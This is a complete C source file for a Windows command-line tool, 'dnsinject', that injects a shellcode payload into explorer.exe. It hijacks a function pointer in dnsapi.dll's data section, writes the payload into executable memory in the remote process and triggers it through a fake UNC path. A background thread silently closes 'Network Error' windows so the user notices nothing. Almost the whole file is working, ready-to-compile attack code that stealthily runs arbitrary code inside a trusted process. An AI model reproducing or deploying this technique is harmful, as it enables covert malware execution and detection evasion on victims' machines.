/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include "../ntlib/util.h"

HRESULT GetDesktopShellView(REFIID riid, void **ppv) {
    HWND           hwnd;
    IDispatch      *pdisp;
    IShellWindows  *psw;
    VARIANT        vEmpty = {};
    IShellBrowser  *psb;
    IShellView     *psv;
    HRESULT        hr;
    
    *ppv = NULL;
        
    hr = CoCreateInstance(CLSID_ShellWindows, 
      NULL, CLSCTX_LOCAL_SERVER, IID_PPV_ARGS(&psw));
      
    if(hr == S_OK) {
      hr = psw->FindWindowSW(
        &vEmpty, &vEmpty, 
        SWC_DESKTOP, (long*)&hwnd, 
        SWFO_NEEDDISPATCH, &pdisp);
        
      if(hr == S_OK) {
        hr = IUnknown_QueryService(
          pdisp, SID_STopLevelBrowser, IID_PPV_ARGS(&psb));
        if(hr == S_OK) {
          hr = psb->QueryActiveShellView(&psv);
          if(hr == S_OK) {
            hr = psv->QueryInterface(riid, ppv);
            psv->Release();
          }
          psb->Release();
        }
        pdisp->Release();
      }
      psw->Release();
    }
    return hr;
}

HRESULT GetShellDispatch(
  IShellView *psv, REFIID riid, void **ppv) 
{
    IShellFolderViewDual *psfvd;
    IDispatch            *pdispBackground, *pdisp;;
    HRESULT              hr;
    
    *ppv = NULL;
    hr = psv->GetItemObject(
      SVGIO_BACKGROUND, IID_PPV_ARGS(&pdispBackground));
    
    if(hr == S_OK) {
      hr = pdispBackground->QueryInterface(IID_PPV_ARGS(&psfvd));
      if(hr == S_OK) {
        hr = psfvd->get_Application(&pdisp);
        if(hr == S_OK) {
          hr = pdisp->QueryInterface(riid, ppv);
          pdisp->Release();
        }
        psfvd->Release();
      }
      pdispBackground->Release();
    }
    return hr;
}

HRESULT ShellExecInExplorer(PCWSTR pszFile) {
    IShellView      *psv;
    IShellDispatch2 *psd;
    HRESULT         hr;
    BSTR            bstrFile;
    VARIANT         vtHide, vtEmpty = {};
    
    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
    
    bstrFile = SysAllocString(pszFile);
    if(bstrFile == NULL) return E_OUTOFMEMORY;
    
    hr = GetDesktopShellView(IID_PPV_ARGS(&psv));
    if(hr == S_OK) {
      hr = GetShellDispatch(psv, IID_PPV_ARGS(&psd));
      if(hr == S_OK) {
        V_VT(&vtHide)  = VT_INT;
        V_INT(&vtHide) = SW_HIDE;
        hr = psd->ShellExecuteW(
          bstrFile, vtEmpty, vtEmpty, vtEmpty, vtEmpty);
        psd->Release();
      }
      psv->Release();
    }
    SysFreeString(bstrFile);
    return hr;
}

// does the pointer reside in the .code section?
BOOL IsCodePtr(LPVOID ptr) {
    MEMORY_BASIC_INFORMATION mbi;
    DWORD                    res;
    
    if(ptr == NULL) return FALSE;
    
    // query the pointer
    res = VirtualQuery(ptr, &mbi, sizeof(mbi));
    if(res != sizeof(mbi)) return FALSE;

    return ((mbi.State   == MEM_COMMIT    ) &&
            (mbi.Type    == MEM_IMAGE     ) && 
            (mbi.Protect == PAGE_EXECUTE_READ));
}

LPVOID GetRemoteModuleHandle(DWORD pid, LPCWSTR lpModuleName) {
    HANDLE        ss;
    MODULEENTRY32 me;
    LPVOID        ba = NULL;
    
    ss = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    
    if(ss == INVALID_HANDLE_VALUE) return NULL;
    
    me.dwSize = sizeof(MODULEENTRY32);
    
    if(Module32First(ss, &me)) {
      do {
        if(me.th32ProcessID == pid) {
          if(lstrcmpi(me.szModule, lpModuleName)==0) {
            ba = me.modBaseAddr;
            break;
          }
        }
      } while(Module32Next(ss, &me));
    }
    CloseHandle(ss);
    return ba;
}

LPVOID GetDnsApiAddr(DWORD pid) {
    LPVOID                m, rm, va = NULL;
    PIMAGE_DOS_HEADER     dos;
    PIMAGE_NT_HEADERS     nt;
    PIMAGE_SECTION_HEADER sh;
    DWORD                 i, cnt, rva=0;
    PULONG_PTR            ds;
    
    // does remote have dnsapi loaded?
    rm  = GetRemoteModuleHandle(pid, L"dnsapi.dll");
    if(rm == NULL) return NULL;
    
    // load local copy
    m   = LoadLibrary(L"dnsapi.dll");
    dos = (PIMAGE_DOS_HEADER)m;  
    nt  = RVA2VA(PIMAGE_NT_HEADERS, m, dos->e_lfanew);  
    sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
          nt->FileHeader.SizeOfOptionalHeader);
          
    // locate the .data segment, save VA and number of pointers
    for(i=0; i<nt->FileHeader.NumberOfSections; i++) {
      if(*(PDWORD)sh[i].Name == *(PDWORD)".data") {
        ds  = RVA2VA(PULONG_PTR, m, sh[i].VirtualAddress);
        cnt = sh[i].Misc.VirtualSize / sizeof(ULONG_PTR);
        break;
      }
    }
    // for each pointer
    for(i=0; i<cnt - 1; i++) {
      // if two pointers side by side are not to code, skip it
      if(!IsCodePtr((LPVOID)ds[i  ])) continue;
      if(!IsCodePtr((LPVOID)ds[i+1])) continue;
      // calculate VA in remote process
      va = ((PBYTE)&ds[i] - (PBYTE)m) + (PBYTE)rm;
      break;
    }
    return va;
}

// for any "Network Error", close the window
VOID SuppressErrors(LPVOID lpParameter) {
    HWND hw;
    
    for(;;) {
      hw = FindWindowEx(NULL, NULL, NULL, L"Network Error");
      if(hw != NULL) {
        PostMessage(hw, WM_CLOSE, 0, 0);
      }
    }
}

VOID dns_inject(LPVOID payload, DWORD payloadSize) {
    LPVOID dns, cs, ptr;
    DWORD  pid, cnt, tick, i, t;
    HANDLE hp, ht;
    SIZE_T wr;
    HWND   hw;
    WCHAR  unc[32]={L'\\', L'\\'}; // UNC path to invoke DNS api

    // 1. obtain process id for explorer
    //    and try read address of function pointers
    GetWindowThreadProcessId(GetShellWindow(), &pid); 
    ptr = GetDnsApiAddr(pid);
    
    // 2. create a thread to suppress network errors displayed
    ht = CreateThread(NULL, 0, 
      (LPTHREAD_START_ROUTINE)SuppressErrors, NULL, 0, NULL);
      
    // 3. if dns api not already loaded, try force 
    // explorer to load via fake UNC path
    if(ptr == NULL) {
      tick = GetTickCount();
      for(i=0; i<8; i++) {
        unc[2+i] = (tick % 26) + 'a';
        tick >>= 2;
      }
      ShellExecInExplorer(unc);
      ptr = GetDnsApiAddr(pid);
    }
    
    if(ptr != NULL) {
      // 4. open explorer, backup address of dns function.
      //    allocate RWX memory and write payload
      hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
      ReadProcessMemory(hp, ptr, &dns, sizeof(ULONG_PTR), &wr);
      cs = VirtualAllocEx(hp, NULL, payloadSize, 
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
      WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
      
      // 5. overwrite pointer to dns function
      //    generate fake UNC path and trigger execution
      WriteProcessMemory(hp, ptr, &cs, sizeof(ULONG_PTR), &wr);
      tick = GetTickCount();
      for(i=0; i<8; i++) {
        unc[2+i] = (tick % 26) + L'a';
        tick >>= 2;
      }
      ShellExecInExplorer(unc);
      
      // 6. restore dns function, release memory and close process
      WriteProcessMemory(hp, ptr, &dns, sizeof(ULONG_PTR), &wr);
      VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
      CloseHandle(hp);
    }
    // 7. terminate thread
    TerminateThread(ht, 0);
}

int main(void) {
    LPVOID  pic;
    DWORD   len;
    int     argc;
    wchar_t **argv;
    
    argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    
    if(argc != 2) {
      printf("\nusage: dnsinject <payload.bin>\n");
      return 0;
    }

    len=readpic(argv[1], &pic);
    if (len==0) { printf("\ninvalid payload\n"); return 0;}
    
    dns_inject(pic, len);
    
    return 0;
}
